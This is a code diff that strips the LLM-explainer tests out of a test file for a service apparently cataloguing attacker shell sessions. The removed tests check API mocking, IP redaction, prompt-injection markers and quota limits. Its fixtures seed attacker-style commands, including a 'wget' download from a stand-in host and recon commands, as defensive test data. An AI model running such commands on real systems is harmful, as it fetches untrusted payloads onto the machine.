@@ -1,19 +1,16 @@
-"""Script library and LLM explainer against a real TimescaleDB, as the ingest role."""
+"""Script library against a real TimescaleDB, as the ingest role."""
 
 import json
 import os
-import re
 from datetime import UTC, datetime, timedelta
 from pathlib import Path
 from typing import Any
 
-import httpx
 import pytest
 from sqlalchemy import text
 from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker
 
 from ingest.features import FeatureSettings
-from ingest.llm.worker import ExplainerWorker
 from ingest.scripts import ScriptWorker, load_annotations
 
 pytestmark = [
@@ -173,186 +170,6 @@ async def test_campaign_and_rule_changes_are_picked_up(
     assert ver.prompt_version == BASE.version  # rebuilt after the rule files "changed"
 
 
-# ---- the LLM explainer ------------------------------------------------------------------------
-USAGE = {"input_tokens": 70, "output_tokens": 30}
-ANSWER = {
-    "content": [
-        {
-            "type": "text",
-            "text": json.dumps(
-                {
-                    "summary": "Looks around the machine.",
-                    "lines": [{"n": 1, "explanation": "Shows the system."}],
-                }
-            ),
-        }
-    ],
-    "usage": {"input_tokens": 100, "output_tokens": 50},
-    "stop_reason": "end_turn",
-}
-
-
-def explainer(
-    factory: async_sessionmaker[AsyncSession], handler: Any, key: str = "test-key", **cfg: Any
-) -> ExplainerWorker:
-    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
-    settings = FeatureSettings(llm_enabled=True, **cfg)
-    return ExplainerWorker(settings, factory, key, client)
-
-
-async def queue(engine: AsyncEngine, script_id: int) -> None:
-    async with engine.begin() as conn:
-        await conn.execute(
-            text("INSERT INTO llm_requests (script_id, requested_by) VALUES (:i, 'admin')"),
-            {"i": script_id},
-        )
-
-
-async def states(engine: AsyncEngine) -> list[tuple[str, str | None]]:
-    return [
-        (r.state, r.detail)
-        for r in await rows(engine, "SELECT state, detail FROM llm_requests ORDER BY id")
-    ]
-
-
-async def one_script(engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]) -> int:
-    await seed(engine, "a", "203.0.113.1", ["uname -a", "wget http://192.0.2.5/x"])
-    await worker(factory).run_once()
-    return int((await rows(engine, "SELECT id FROM scripts"))[0].id)
-
-
-async def test_a_request_is_answered_cached_and_sends_only_the_normalised_script(
-    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
-) -> None:
-    sid = await one_script(engine, factory)
-    seen: list[httpx.Request] = []
-
-    def handler(request: httpx.Request) -> httpx.Response:
-        seen.append(request)
-        return httpx.Response(200, json=ANSWER)
-
-    w = explainer(factory, handler)
-    await queue(engine, sid)
-    await w.run_once()
-    assert await states(engine) == [("done", None)]
-    body = json.loads(seen[0].content)
-    sent = json.dumps(body, ensure_ascii=False)
-    assert "192.0.2.5" not in sent and "203.0.113.1" not in sent and "\u2039url\u203a" in sent
-    marker = re.findall(r"untrusted-script-[0-9a-f]{16}", body["system"])[0]
-    assert body["messages"][0]["content"].startswith(f"<{marker}>\nL01|")
-    assert seen[0].headers["x-api-key"] == "test-key"
-    llm = (
-        await rows(
-            engine, "SELECT model, summary, lines FROM script_explanations WHERE source = 'llm'"
-        )
-    )[0]
-    assert llm.summary == "Looks around the machine." and llm.model == "claude-haiku-5-5"
-    assert llm.lines[0]["explanation"] == "Shows the system." and len(llm.lines) == 2
-    tokens = await rows(
-        engine, "SELECT used FROM enrichment_quota WHERE provider = 'anthropic:tokens'"
-    )
-    assert tokens[0].used == 150
-
-    await queue(engine, sid)  # cached: no second call
-    await w.run_once()
-    assert len(seen) == 1 and (await states(engine))[-1] == ("done", "cached")
-    await w.aclose()
-
-
-@pytest.mark.parametrize(
-    ("case", "expected"),
-    [
-        ("no_key", ("refused", "no_key")),
-        ("daily", ("refused", "daily_quota")),
-        ("tokens", ("refused", "token_cap")),
-        ("auth", ("failed", "auth")),
-        ("limit", ("failed", "rate_limited")),
-        ("garbage", ("failed", "bad_answer")),
-        ("refusal", ("failed", "refused")),
-        ("cut", ("failed", "truncated")),
-        ("net", ("failed", "network")),
-    ],
-)
-async def test_limits_and_errors_end_a_request_cleanly(
-    engine: AsyncEngine,
-    factory: async_sessionmaker[AsyncSession],
-    case: str,
-    expected: tuple[str, str],
-) -> None:
-    sid = await one_script(engine, factory)
-    calls = 0
-
-    def handler(request: httpx.Request) -> httpx.Response:
-        nonlocal calls
-        calls += 1
-        match case:
-            case "auth":
-                return httpx.Response(401, json={"error": {"message": "secret test-key"}})
-            case "limit":
-                return httpx.Response(429)
-            case "garbage":
-                return httpx.Response(
-                    200, json={"content": [{"type": "text", "text": "hello"}], "usage": USAGE}
-                )
-            case "cut":
-                return httpx.Response(
-                    200, json={"content": [], "usage": USAGE, "stop_reason": "max_tokens"}
-                )
-            case "refusal":
-                return httpx.Response(
-                    200, json={"content": [], "usage": USAGE, "stop_reason": "refusal"}
-                )
-            case "net":
-                raise httpx.ConnectError("down")
-        return httpx.Response(200, json=ANSWER)
-
-    cfg: dict[str, Any] = {}
-    key = "" if case == "no_key" else "test-key"
-    if case == "daily":
-        cfg["llm_daily_quota"] = 0
-    if case == "tokens":
-        cfg["llm_monthly_token_cap"] = 10
-        async with engine.begin() as conn:
-            await conn.execute(
-                text(
-                    "INSERT INTO enrichment_quota (provider, day, used) VALUES ('anthropic:tokens', date_trunc('month', now() AT TIME ZONE 'utc')::date, 10)"
-                )
-            )
-    w = explainer(factory, handler, key, **cfg)
-    await queue(engine, sid)
-    await w.run_once()
-    assert await states(engine) == [expected]
-    if expected[0] == "refused":
-        assert calls == 0
-    spent = await rows(
-        engine,
-        "SELECT used FROM enrichment_quota WHERE provider = 'anthropic:tokens' AND used > 10",
-    )
-    if case in {"garbage", "refusal", "cut"}:
-        assert spent[0].used == 100  # a 200 answer costs tokens whatever came out of it
-    elif case != "tokens":
-        assert spent == []
-    detail = (await states(engine))[0][1] or ""
-    assert "test-key" not in detail
-    await w.aclose()
-
-
-async def test_the_key_test_lists_models_and_spends_no_tokens(
-    factory: async_sessionmaker[AsyncSession],
-) -> None:
-    paths: list[str] = []
-
-    def handler(request: httpx.Request) -> httpx.Response:
-        paths.append(request.url.path)
-        return httpx.Response(200, json={"data": []})
-
-    w = explainer(factory, handler)
-    assert (await w.run_key_test())["ok"] is True and paths == ["/v1/models"]
-    w.api_key = ""
-    assert (await w.run_key_test())["error"] == "no_key"
-    await w.aclose()
-
-
 # ---- bounds and failure isolation ---------------------------------------------------------------
 async def test_a_session_with_thousands_of_commands_is_read_in_bounded_rows(
     engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
@@ -432,25 +249,3 @@ async def test_past_the_link_cap_a_re_read_is_not_counted_twice(
 async def engine_exec(engine: AsyncEngine, sql: str) -> None:
     async with engine.begin() as conn:
         await conn.execute(text(sql))
-
-
-async def test_each_request_gets_its_own_unguessable_marker(
-    engine: AsyncEngine, factory: async_sessionmaker[AsyncSession]
-) -> None:
-    await seed(engine, "a", "203.0.113.1", ["uname -a", "id"], age_min=60)
-    await seed(engine, "b", "203.0.113.2", ["whoami", "uname -a"], age_min=59)
-    await worker(factory).run_once()
-    ids = [r.id for r in await rows(engine, "SELECT id FROM scripts ORDER BY id")]
-    bodies: list[dict[str, Any]] = []
-
-    def handler(request: httpx.Request) -> httpx.Response:
-        bodies.append(json.loads(request.content))
-        return httpx.Response(200, json=ANSWER)
-
-    w = explainer(factory, handler)
-    for script_id in ids:
-        await queue(engine, script_id)
-        await w.run_once()
-    found = [re.findall(r"untrusted-script-[0-9a-f]{16}", b["system"])[0] for b in bodies]
-    assert len(found) == 2 and found[0] != found[1]
-    await w.aclose()
